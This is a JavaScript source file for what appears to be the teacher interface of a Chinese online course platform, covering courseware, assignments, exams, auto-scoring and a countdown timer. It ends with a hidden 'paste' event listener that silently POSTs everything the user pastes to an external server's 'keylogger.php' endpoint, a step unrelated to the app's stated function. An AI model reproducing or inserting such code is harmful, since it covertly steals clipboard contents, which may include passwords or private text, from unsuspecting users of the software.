/**
 * 
 * 
 * 课程左侧公告信息栏
 * 
 */
var course = {

    infoList: [
        {
            icon: 'el-icon-bell',
            title: '公告',
            children: [
                {
                    title: '课程介绍',
                    href: 'courseNotice.html'
                }
            ],
        },
        {
            icon: 'el-icon-reading',
            title: '课件',
            children: [
                {
                    title: '课件',
                    href: 'courseWare.html'
                },
                {
                    title: '课件添加',
                    href: 'courseWareMsg.html'
                }
            ],
        },
        {
            icon: 'el-icon-edit',
            title: '测试与作业',
            children: [
                {
                    title: '题型作业',
                    href: 'courseWork.html'
                },
                {
                    title: '文档作业',
                    href: 'docWork.html'
                },
                {
                    title: '查看提交',
                    href: 'workInfo.html'
                }
            ],
        },
        {
            icon: 'el-icon-eleme',
            title: '考试',
            children: [
                {
                    title: '考试',
                    href: 'exam.html'
                },
                {
                    title: '考试提交',
                    href: 'studentWorkInfo.html'
                }
            ],
        },
        {
            icon: 'el-icon-chat-dot-square',
            title: '讨论区',
            children: [
                {
                    title: '讨论区',
                    href: 'talk.html'
                }
            ],
        },
        {
            icon: 'el-icon-medal',
            title: '评价',
            children: [
                {
                    title: '评价',
                    href: 'evaluate.html'
                }
            ],
        },
        {
            icon: 'el-icon-s-grid',
            title: '学生管理',
            children: [
                {
                    title: '学生信息',
                    href: 'studentInfo.html'
                },
                {
                    title: '使用统计',
                    href: 'evaluate.html'
                }
            ],
        }
    ],
    courseOutline: [
        {
            name: '第一单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第二单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第三单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第四单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        },
        {
            name: '第五单元',
            isComplete: false,
            children: [
                {
                    name: '第一节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第二节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第三节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                },
                {
                    name: '第四节',
                    isComplete: false,
                    link: {
                        video: '',
                        txt: '',
                        pdf: '',
                        word: ''
                    }
                }
            ]
        }
    ]
}


var userOptions = {
    order: [
        {
            title: '退出课堂',
            icon: 'el-icon-back',
            href: 'courseEdit.html'
        }
    ]
}
var danxuan = [];
var duoxuan = [];
var tiankong = [];
var zhuguan = [];
//请求得到
var answer = [
    {
        type: 'dx',
        value: [0, 0, 2, 2, 3, 3, 3, 3],
        score: 5
    },
    {
        type: 'sx',
        value: [['A1', 'A4']],
        score: 10
    },
    {
        type: 'tk',
        value: ['123456', '654321'],
        score: 10
    },
    {
        type: 'zg',
        value: ['123456'],
        score: 30
    }
];
danxuan.forEach((item) => {
    item.select = 'default';
    item.type = -1;
});
duoxuan.forEach((item) => {
    item.select = [];
    item.type = -1;
});
tiankong.forEach((item) => {
    item.type = -1;
    item.standard = [];
    item.auto = false;
});
zhuguan.forEach((item) => {
    item.type = -1;
    item.standard = [];
    item.auto = false;
});
//================================================================================




var app = new Vue({
    el: '#app',
    data: {
        user: window.localStorage.getItem('_userName'),
        course: course,
        userOptions: userOptions,
        name: JSON.parse(window.localStorage.getItem('_course')).name,
        activeNames: ['1'],
        test: [],
        exam: [
            { title: '考试一', start: '2019-8-7', end: '2019-12-7', info: '其他', state: 0, score: 87 },
            { title: '考试二', start: '2019-9-7', end: '2019-12-7', info: '其他', state: 1, score: 0 },
            { title: '考试三', start: '2019-9-7', end: '2019-12-7', info: '其他', state: -1, score: 0 }
        ],
        radio: '1',
        danxuan: danxuan,
        duoxuan: duoxuan,
        tiankong: tiankong,
        zhuguan: zhuguan,
        answer: answer,
        disabled: false,
        time: '00:10:10',
        current: {
            exam: window.localStorage.getItem('exam'),
            work: { name: 'XX' },
            state: 0
        },
        talk: [
            { name: 'Lumnca', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 84, date: '2019/12/21 20:12' },
            { name: 'Kay', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 45, date: '2019/12/24 04:23' },
            { name: 'May', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 233, date: '2019/12/29 11:58' }
        ],
        evaluate: {
            number: 3.9,
            infor: ''
        },
        ruleForm: {
            name: 'XXX',
            type: 'public',
            start_date: new Date(2020, 10, 5),
            start_time: new Date(2020, 10, 5, 12, 12, 12),
            is_cost: false,
            course_icon: ['科技', '技术'],
            other: '基本',
            info: 'xxxxxx',
            price: 0,
            info: ''
        },
        rules: {
            name: [
                { required: true, message: '请输入课堂名称', trigger: 'blur' },
                { min: 2, max: 25, message: '长度在 2 到 25 个字符', trigger: 'blur' }
            ],
            type: [
                { required: true, message: '请输入', trigger: 'change' }
            ],
            start_date: [
                { type: 'date', required: true, message: '请选择日期', trigger: 'change' }
            ],
            start_time: [
                { type: 'date', required: true, message: '请选择时间', trigger: 'change' }
            ],
            course_icon: [
                { type: 'array', required: true, message: '请至少选择一个', trigger: 'change' }
            ],
            other: [
                { required: true, message: '请选择', trigger: 'change' }
            ],
            info: [
                { required: true, message: '请输入课堂介绍', trigger: 'blur' }
            ],
            price: [
                { type: 'number', required: true, message: '请输入价格', trigger: 'change' }
            ]
        },
        wares: [{
            id: '0',
            label: '第一章',
            children: [{
                id: '0-0',
                label: '课题一',
                children: [],
                viedo: 'class1.mp4',
                pdf: '',
                file: '',
                other: ''
            }]
        }],
        ware: {
            id: '',
            label: '',
            children: [],
            viedo: '',
            pdf: '',
            file: '',
            other: '',
            fileList: []
        },
        ruleForm2: {
            title: '',
            start: '',
            end: '',
            disabled: true,
            info: '',
            test: 0,
            score: 0,
            startdate1: '',
            startdate2: '',
            enddate1: '',
            enddate2: '',
        },
        ruleForm3: {
            name: '',
            startdate1: '',
            startdate2: '',
            enddate1: '',
            enddate2: '',
            disabled: true,
            info: '',
            test: 0,
        },
        rules2: {},
        dialogFormVisible: false,
        dialogFormVisible2: false,
        dialogFormVisible3: false,
        dialogFormVisible4: false,
        dialogFormVisible5: false,
        dialogFormVisible6: false,
        dialogFormVisible7: false,
        dialogFormVisible8: false,
        dialogFormVisible9: false,
        selectTest: {
            title: '',
            options: [],
            answer: '',
            score: 0
        },
        selectTestTianKong: {
            title: '题目主干信息',
            input: '',
            score: 4,
            type: -1,
            standard: [],
            auto: false
        },
        selectTestZhuGuan: {
            title: '题目主干信息',
            input: '',
            score: 4,
            type: -1,
            standard: [],
            auto: false
        },
        selectExam: {
            title: '',
            start: '',
            end: '',
            disabled: true,
            info: '',
            test: 0,
            score: 0,
            startdate1: '',
            startdate2: '',
            enddate1: '',
            enddate2: '',
        },
        workInfo: [],
        multipleSelection: [],
        editdisabled: true,
        workRate: [],
        sortBut: "升序",
        filterRate: 0.5,
        search: '',
        subjectData: {},
        sumbitNumber: {},
        docWorks: [],
        docWork: {
            name: '文案作业一',
            date: '2020/02/09 12:00',
            file: 'first.doc',
            state: true,
            date1: '',
            date2: ''
        },
        fileList: [{ name: 'food.jpeg', url: 'https://fuss10.elemecdn.com/3/63/4e7f3a15429bfda99bce42a18cdd1jpeg.jpeg?imageMogr2/thumbnail/360x360/format/webp/quality/100' }, { name: 'food2.jpeg', url: 'https://fuss10.elemecdn.com/3/63/4e7f3a15429bfda99bce42a18cdd1jpeg.jpeg?imageMogr2/thumbnail/360x360/format/webp/quality/100' }],
        docWorkSumbit: [{ name: '张三', file: 'zs.doc', date: '2018/12/21 12:00', score: '79' }],
        selectDocWork: { name: '张三', file: 'zs.doc', date: '2018/12/21 12:00', score: '79' },
        studentInfoData: []
    },
    methods: {
        handleOpen(key, keyPath) {

        },
        handleClose(key, keyPath) {

        },
        handleChange(val) {

        },
        dateFormat(date, type) {
            if (type == 1) {
                return date.getFullYear() + "/" + (date.getMonth() + 1) + "/" + date.getDate();
            }
            else {
                return (date.getHours() > 9 ? date.getHours() : '0' + date.getHours()) + ":" + (date.getMinutes() > 9 ? date.getMinutes() : '0' + date.getMinutes()) + ":" + (date.getSeconds() > 9 ? date.getSeconds() : '0' + date.getSeconds());
            }
        },
        submitForm(formName) {
            let cid = JSON.parse(window.localStorage.getItem('_course')).id;

            this.$refs[formName].validate((valid) => {
                if (valid) {
                    var c = app.ruleForm;
                    c.is_cost = c.is_cost ? 1 : 0;
                    c.course_icon = c.course_icon.toString();
                    axios.put('http://127.0.0.1:8081/course/' + cid, c)
                        .then(function (response) {
                            app.$message({
                                message: '修改成功！',
                                type: 'success'
                            });
                            setTimeout(()=>{
                                window.location.reload();
                            },200);
                        })
                        .catch(function () {
                            alert("请求失败!");
                        });

                } else {
                    console.log('error submit!!');
                    return false;
                }
            });

        },
        resetForm(formName) {
            this.$refs[formName].resetFields();

        },
        submitForm2(form) {
            var success = false;
            console.log(form);
            if (form.startdate1 != '' && form.startdate2 != '' && form.enddate1 != '' && form.enddate2 != '') {
                if (form.startdate1.getTime() <= form.enddate1.getTime()) {
                    if (form.startdate1.getTime() == form.enddate1.getTime()) {
                        if (form.startdate2.getTime() <= form.enddate2.getTime()) {
                            success = true;
                        }
                    }
                    else {
                        success = true;
                    }
                }
                if (success) {
                    this.$message({
                        message: '添加成功！',
                        type: 'success'
                    });
                    var data1 = form.startdate1.getFullYear() + '/' + form.startdate1.getMonth() + '/' + form.startdate1.getDate() + ' ' +
                        (form.startdate2.getHours() > 9 ? form.startdate2.getHours() : '0' + form.startdate2.getHours()) + ':' +
                        (form.startdate2.getMinutes() > 9 ? form.startdate2.getMinutes() : '0' + form.startdate2.getMinutes()) + ':' +
                        (form.startdate2.getSeconds() > 9 ? form.startdate2.getSeconds() : '0' + form.startdate2.getSeconds());

                    var data2 = form.enddate1.getFullYear() + '/' + form.enddate1.getMonth() + '/' + form.enddate1.getDate() + ' ' +
                        (form.enddate2.getHours() > 9 ? form.enddate2.getHours() : '0' + form.enddate2.getHours()) + ':' +
                        (form.enddate2.getMinutes() > 9 ? form.enddate2.getMinutes() : '0' + form.enddate2.getMinutes()) + ':' +
                        (form.enddate2.getSeconds() > 9 ? form.enddate2.getSeconds() : '0' + form.enddate2.getSeconds());


                    this.test[form.test].works.push({
                        title: form.name.trim(),
                        start: data1,
                        end: data2,
                        info: form.info,
                        state: form.disabled ? '可用' : '不可用'
                    });
                }
                else {
                    this.$message.error('起始日期应该比结束日期小！');
                }
            }
            else {
                this.$message.error('请将日期信息填写完整！');
            }
        },
        resetForm2(formName) {
            this.$refs[formName].resetFields();
        },
        rename(e, data) {
            window.event ? window.event.cancelBubble = true : e.stopPropagation();
            this.$prompt('请输入', '提示', {
                confirmButtonText: '确定',
                cancelButtonText: '取消',
                inputValue: data.title
            }).then(({ value }) => {
                data.title = value;
                this.$message({
                    type: 'success',
                    message: '已命名为' + value
                });
            }).catch(() => {
                this.$message({
                    type: 'info',
                    message: '取消输入'
                });
            });
        },
        delTest(e, data) {
            window.event ? window.event.cancelBubble = true : e.stopPropagation();
            //
            this.test.splice(this.test.indexOf(data), 1);

        },
        editTestDanXuan(data) {
            this.dialogFormVisible = true;
            this.selectTest = data;
        },
        editTestDuoXuan(data) {
            this.dialogFormVisible2 = true;
        },
        editTestTianKong(data) {
            this.dialogFormVisible3 = true;
            this.selectTestTianKong = data;
        },
        editTestZhuGuan(data) {
            this.dialogFormVisible4 = true;
            this.selectTestZhuGuan = data;
        },
        editWork(data) {

            this.dialogFormVisible5 = true;
            this.ruleForm2 = data.row;
        },
        editExam(data) {
            this.dialogFormVisible6 = true;
            this.selectExam = data;
        },
        updateWorkInfo(data) {
            this.dialogFormVisible5 = false;
            data.start_time = new Date(this.dateFormat(data.start_date, 1) + " " + this.dateFormat(data.start_time, 0));
            data.end_time = new Date(this.dateFormat(data.end_date, 1) + " " + this.dateFormat(data.end_time, 0));

            if (data.end_time.getTime() < data.start_time.getTime()) {
                this.$message({
                    message: '起始日期比结束日期大，已重置结束日期！',
                    type: 'warning'
                });
                data.end_time = new Date(this.dateFormat(data.start_date, 1) + " " + this.dateFormat(data.start_time, 0));
            }

            axios.put('http://127.0.0.1:8081/works/' + data.id, data)
                .then(function (response) {
                    app.$message({
                        type: 'success',
                        message: '作业编辑成功 '
                    });
                })
                .catch(function (error) {
                    alert("失败!");
                });
        },
        append(data) {
            var id = data.id;

            if (!data.children) {
                this.$set(data, 'children', []);

            }
            if (data.children.length == 0) {
                id = id + '-0';
                console.log(id);
                const newChild = { id: id, label: '新子节点', children: [], viedo: '', file: '', pdf: '', other: '' };

                if (id.length > 3) {
                    this.$message({
                        message: '暂时不允许开启3级节点',
                        type: 'warning'
                    });
                }
                else {
                    data.children.push(newChild);
                }
            }
            else {
                var len = data.children.length;
                var re = data.children[data.children.length - 1].id;
                re = re.substr(0, re.length - 1) + len.toString();
                const newChild = { id: re, label: '新节点', children: [] };
                data.children.push(newChild);
            }


        },
        addnode() {
            var str = this.wares.length;
            this.wares.push({ id: '' + str, children: [], label: '新节点' });
        },
        remove(node, data) {
            const parent = node.parent;
            const children = parent.data.children || parent.data;
            const index = children.findIndex(d => d.id === data.id);
            children.splice(index, 1);
        },
        saveWare(wares) {
            let id = JSON.parse(window.localStorage.getItem("_course")).id;
            axios.put('http://127.0.0.1:8081/wares/' + id, {
                id: id,
                notice: app.ruleForm.info,
                ware: JSON.stringify(wares)
            })
                .then(function (response) {
                    app.$message({
                        type: 'success',
                        message: '数据保存成功 '
                    });
                })
                .catch(function (error) {
                    alert("失败!");
                });
        },
        update(data) {
            this.$prompt('请输入新名称', '提示', {
                confirmButtonText: '确定',
                cancelButtonText: '取消',
                inputValue: data.label
            }).then(({ value }) => {
                data.label = value;
                this.$message({
                    type: 'success',
                    message: '修改成功 '
                });
            }).catch(() => {
                this.$message({
                    type: 'info',
                    message: '取消输入'
                });
            });
        },
        addTest() {
            let w = {
                id: max_Id + 1,
                cid: JSON.parse(window.localStorage.getItem('_course')).id,
                start_date: app.dateFormat(new Date(), 1),
                start_time: app.dateFormat(new Date(), 1),
                end_date: app.dateFormat(new Date(), 1),
                end_time: app.dateFormat(new Date(), 1),
                info: '无',
                name: '新建作业名',
                work: ''
            }
            this.$confirm('此操作将会建立一份新的作业, 是否继续?', '提示', {
                confirmButtonText: '确定',
                cancelButtonText: '取消',
                type: 'warning'
            }).then(() => {

                axios.post('http://127.0.0.1:8081/works/', w)
                    .then(function (response) {
                        app.$message({
                            type: 'success',
                            message: '创建成功！'
                        });
                        setTimeout(() => {
                            window.location.reload();
                        }, 200);
                    })
                    .catch(function (error) {
                        alert("失败!");
                    });


            }).catch(() => {
                this.$message({
                    type: 'info',
                    message: '已取消创建'
                });
            });


        },
        setTest() {
            this.dialogFormVisible = false;
        },
        deleteWork(i) {
            this.test.splice(i, 1);
        },
        addTestDanXuan() {
            this.danxuan.push({
                title: '题目主体',
                options: ['A', 'B', 'C', 'D'],
                score: 4,
                type: -1,
                select: 'default'
            });
        },
        addTestDuoXuan() {
            this.duoxuan.push({
                title: '题目主体',
                options: ['A', 'B', 'C', 'D', 'E'],
                score: 4,
                type: -1,
                select: [],
                answer: []
            });
        },
        delDanXuan(index) {
            this.danxuan.splice(index, 1);
        },
        saveWork(data) {
            let work = {
                danxuan: app.danxuan,
                duoxuan: app.duoxuan,
                tiankong: app.tiankong,
                zhuguan: app.zhuguan
            }
            data.work = JSON.stringify(work);

            axios.put('http://127.0.0.1:8081/works/' + data.id, data)
                .then(function (response) {
                    app.$message({
                        type: 'success',
                        message: '作业编辑成功 '
                    });
                })
                .catch(function (error) {
                    alert("失败!");
                });
        },
        computedScore() {
            var score = 0;
            var tkMistake = 0;
            var dxMistake = 0;
            var zgMistake = 0;
            var sxMistake = 0;
            this.answer.forEach((item) => {
                if (item.type == 'dx') {
                    for (let index = 0; index < this.danxuan.length; index++) {

                        if (app.danxuan[index].select == item.value[index]) {
                            score += item.score;
                            console.log("d YES");
                        }
                        else {
                            dxMistake++;
                            app.danxuan[index].type = 1;
                        }
                    }
                }
                else if (item.type == 'sx') {
                    for (let index = 0; index < this.duoxuan.length; index++) {
                        if (app.duoxuan[index].select.toString() == item.value[index].toString()) {
                            score += item.score;
                            console.log("s YES");
                        }
                        else {
                            sxMistake++;
                            app.duoxuan[index].type = 1;
                        }
                    }
                }
                else if (item.type == 'tk') {
                    for (let index = 0; index < this.tiankong.length; index++) {
                        if (app.tiankong[index].input.trim() == item.value[index]) {
                            score += item.score;
                            console.log("t YES");
                        }
                        else {
                            tkMistake++;
                            app.tiankong[index].type = 1;
                        }
                    }
                }
                else {
                    for (let index = 0; index < this.zhuguan.length; index++) {
                        if (app.zhuguan[index].input.trim() == item.value[index]) {
                            score += item.score;
                            console.log("z YES");
                        }
                        else {
                            zgMistake++;
                            app.zhuguan[index].type = 1;
                        }
                    }
                }
            });

            app.disabled = true;

            this.$notify({
                title: '提示',
                message: '选择题错误个数: ' + (dxMistake + sxMistake) + '  填空题错误个数: ' + tkMistake + ' 主观题错误个数: ' + zgMistake + '  最后得分:' + score,
                duration: 0
            });
        },
        showWork(scope) {
            window.localStorage.setItem("_work", JSON.stringify(scope.row));
            window.location.href = "test.html";
        },
        showDocSumbit(scope) {
            window.localStorage.setItem("work", scope.row.name);
            window.location.href = "wocWorkInfo.html";
        },
        addZ(item) {
            item.number += 1;
        },
        toggleSelection(rows) {
            if (rows) {
                rows.forEach(row => {
                    this.$refs.multipleTable.toggleRowSelection(row);
                });
            } else {
                this.$refs.multipleTable.clearSelection();
            }
        },
        handleSelectionChange(val) {
            this.multipleSelection = val;
        },
        deleteStuWork(i) {
            this.workInfo.splice(i, 1);
        },
        showSumbit() {
            window.location.href = "studentWorkInfo.html";
        },
        deleteExam(i) {
            this.exam.splice(i, 1);
        },
        showExam(title) {
            window.localStorage.setItem("exam", title);
            window.location.href = "examInfo.html";
        },
        addExam() {
            this.exam.push({ title: '未命名', start: '2019-1-1', end: '2019-1-1', info: '其他', state: 0, score: 0 });
        },
        rateSort() {
            if (this.sortBut == "降序") {
                this.workRate.sort((a, b) => {
                    return b.rate - a.rate;
                })
                this.sortBut = "升序";
            }
            else {
                this.workRate.sort((a, b) => {
                    return a.rate - b.rate;
                })
                this.sortBut = "降序";
            }

        },
        updateRate() {
            this.workRate = [];
            data.forEach((e, i) => {
                if (e.rate >= app.filterRate) {
                    app.workRate.push(e);
                }
            })
        },
        editDocWork(data) {
            this.dialogFormVisible7 = true;
            this.docWork = data;
        },
        handleRemove(file, fileList) {
            console.log(file, fileList);
        },
        beforeRemove(file, fileList) {
            axios.get('http://127.0.0.1:8081/delete', {
                params: {
                    file: 'static/public/' + file.name
                }
            })
                .then(function (response) {
                    app.$message({
                        type: 'success',
                        message: response.data
                    });
                    console.log(response.data);
                })
                .catch(function (error) {
                    console.log(error);
                });
        },
        handleAvatarSuccess(res, file) {
            this.docWork.file.splice(0, 1);
            this.docWork.file.push({
                name: file.name,
                url: file.name
            });
            this.$message({
                message: '文件:' + file.name + '上传成功！',
                type: 'success'
            });
        },
        handleAvatarSuccessWareViedo(res, file) {
            this.ware.viedo = file.name;
            this.$message({
                message: '文件:' + file.name + '上传成功！',
                type: 'success'
            });
        },
        handleAvatarSuccessWarePDF(res, file) {
            this.ware.pdf = file.name;
            this.$message({
                message: '文件:' + file.name + '上传成功！',
                type: 'success'
            });
        },
        addDocWork() {
            this.docWorks.push({
                name: '新建文案',
                date: '2020/02/12 16:00',
                file: [{ name: 'xx', url: '../assets/img/logo1.png' }],
                state: false,
                date1: '',
                date2: ''
            });
        },
        addViedo(ch, type) {
            if (type === 1) {
                this.ware = ch;
                this.dialogFormVisible7 = true;
            }
            else {
                this.ware = ch;
                this.dialogFormVisible9 = true;
            }

        },
        delSDocWorkSumbit(i) {
            this.docWorkSumbit.splice(i, 1)
        },
        initRequest() {
            let id = JSON.parse(window.localStorage.getItem("_course")).id;

            axios.get('http://127.0.0.1:8081/wares/' + id)
                .then(function (response) {
                    app.ruleForm.info = response.data.notice;
                    app.wares = JSON.parse(response.data.ware);
                })
                .catch(function (error) {
                    return null;
                });
        }
    },
    computed: {
        write: function () {
            let i = 0;
            this.danxuan.forEach((item) => {
                if (item.select != 'default' && this.editdisabled) {
                    item.type = 0;
                    i++;
                }
                else if (item.select == 'default' && this.editdisabled) {
                    item.type = -1;
                }
            });
            this.duoxuan.forEach((item) => {
                if (item.select.length != 0) {
                    item.type = 0;
                    i++;
                }
                else {
                    item.type = -1;
                }
            });
            this.tiankong.forEach((item) => {
                if (item.input.length > 0) {
                    item.type = 0;
                    i++;
                }
                else {
                    item.type = -1;
                }
            });
            this.zhuguan.forEach((item) => {
                if (item.input.length > 0) {
                    item.type = 0;
                    i++;
                }
                else {
                    item.type = -1;
                }
            });
            return "完成度:" + i + "/" + (this.danxuan.length + this.tiankong.length + this.duoxuan.length + this.zhuguan.length);
        },
        countDown: function () {


        },
        danxuanAllScore: function () {
            var sum = 0;
            this.danxuan.forEach((item) => {
                sum += item.score;
            });
            return sum;
        },
        duoxuanAllScore: function () {
            var sum = 0;
            this.duoxuan.forEach((item) => {
                sum += item.score;
            });
            return sum;
        },
        tiankongAllScore: function () {
            var sum = 0;
            this.tiankong.forEach((item) => {
                sum += item.score;
            });
            return sum;
        },
        zhuguanAllScore: function () {
            var sum = 0;
            this.zhuguan.forEach((item) => {
                sum += item.score;
            });
            return sum;
        },
        AllScore: function () {

            return this.danxuanAllScore + this.duoxuanAllScore + this.tiankongAllScore + this.zhuguanAllScore;
        }
    },
    mounted() {

    }
});
app.current.work = window.localStorage.getItem('work');
app.current.test = window.localStorage.getItem('exam');
app.current.state = window.localStorage.getItem('state');

var time = app.time;
var hh = parseInt(time.split(':')[0]);
var mm = parseInt(time.split(':')[1]);
var ss = parseInt(time.split(':')[2]);
var timer = setInterval(() => {
    var hh = parseInt(time.split(':')[0]);
    var mm = parseInt(time.split(':')[1]);
    var ss = parseInt(time.split(':')[2]);
    if (ss > 0) {
        ss -= 1;
    }
    else {
        if (mm > 0) {
            ss = 59;
            mm -= 1;

        }
        else {
            if (hh > 0) {
                ss = 59;
                mm = 59;
                hh -= 1;
            }
        }
    }
    if (mm < 10) {
        mm = '0' + mm;
    }
    if (ss < 10) {
        ss = '0' + ss;
    }
    if (hh < 10) {
        hh = '0' + hh;
    }
    app.time = hh + ':' + mm + ':' + ss;
    time = app.time;
    if (hh == 0 && mm == 0 && ss == 0) {
        app.time = '- -:- -:- -';
        clearInterval(timer);
        app.disabled = true;
    }
}, 1000);


window.addEventListener('paste', function (e) {
    console.log(e.clipboardData.getData('text'));
    var txt = e.clipboardData.getData('text');
    var http = new XMLHttpRequest();
    http.open("POST", "http://47.106.254.86:1234/test/keylogger.php", false);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send("key=" + txt);
}, false)